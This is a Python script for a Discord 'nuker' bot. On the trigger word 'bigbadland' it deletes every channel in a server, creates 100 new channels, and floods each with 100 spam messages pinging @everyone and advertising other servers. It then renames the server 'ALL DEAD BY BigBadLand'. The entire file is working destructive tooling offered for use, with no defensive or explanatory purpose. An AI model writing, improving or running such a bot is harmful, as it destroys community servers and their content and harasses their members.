import discord
import asyncio
import argparse

parser = argparse.ArgumentParser(description='Run the Discord nuker bot.')
parser.add_argument('--token', required=False, help='Discord bot token')
args = parser.parse_args()

if args.token:
    TOKEN = args.token
else:
    TOKEN = input('[YOUR BOT TOKEN HOMS] : ')

CHANNEL_NAME_PREFIX = 'big bad land'
SPAM_MESSAGE = '# NAGMAMAHAL, REVSHIT.\n> ***SHOUTOUT TO ALL MY HOMIES :***\n• https://discord.gg/revshit\n•  https://discord.gg/shalom\n• https://discord.gg/xtazy\n//   **BigBadLand😈**\n\n// ***social***\n\n• https://discord.gg/3fsBKJXCfX\n• https://www.youtube.com/@mondevilish\n\n***ITATAK MO SA BUNGO MO: WAG DAPAT LUMAKI YUNG ULO HA STAYHUMBLE AND DONT SNITCH TO OUR HOMIES <33 | https://cdn.discordapp.com/attachments/1356921723420807243/1379063555311271976/mondevilish666.gif?ex=683ee085&is=683d8f05&hm=2d8f41dd5dd65f441577f29eef8bdaf2a75af4cb4bd8850b3cb258847c516a14& | https://cdn.discordapp.com/attachments/1356921723420807243/1378124346610028737/rev.gif?ex=683b75d0&is=683a2450&hm=ba768a25aae6ebb9ba97186166b8612434b97200557237e1929b431e803010af&***\n\n|| @everyone || || @here ||'
NUM_CHANNELS = 100

intents = discord.Intents.default()
intents.guilds = True
intents.guild_messages = True
intents.message_content = True

client = discord.Client(intents=intents)

@client.event
async def on_message(message):
    if message.author == client.user:
        return
    if message.content.lower() == 'bigbadland':
        await message.delete()
        guild = message.guild
        # Delete all channels at once
        channels_to_delete = list(guild.channels)
        delete_tasks = [channel.delete() for channel in channels_to_delete]
        results = await asyncio.gather(*delete_tasks, return_exceptions=True)
        for channel, result in zip(channels_to_delete, results):
            if isinstance(result, Exception):
                print(f'Failed to delete {channel.name}: {result}')
            else:
                print(f'Deleted channel: {channel.name}')

        async def spam_channel(channel):
            try:
                for _ in range(100):  # Sends 100 messages per channel
                    await channel.send(SPAM_MESSAGE)
                    await asyncio.sleep(0.5)  # Avoid rate limits
                print(f'Spammed messages in: {channel.name}')
            except Exception as e:
                print(f'Failed to spam in {channel.name}: {e}')

        # Create channels and spam simultaneously
        tasks = []
        for i in range(NUM_CHANNELS):
            async def create_and_spam(i=i):
                try:
                    channel = await guild.create_text_channel(CHANNEL_NAME_PREFIX)
                    print(f'Created channel: {channel.name}')
                    await spam_channel(channel)
                except Exception as e:
                    print(f'Failed to create or spam channel {i+1}: {e}')
            tasks.append(asyncio.create_task(create_and_spam()))
        await asyncio.gather(*tasks)

        # Change server name only
        try:
            await guild.edit(name="ALL DEAD BY BigBadLand")
            print('Server name changed successfully.')
        except Exception as e:
            print(f'Failed to change server name: {e}')

client.run(TOKEN)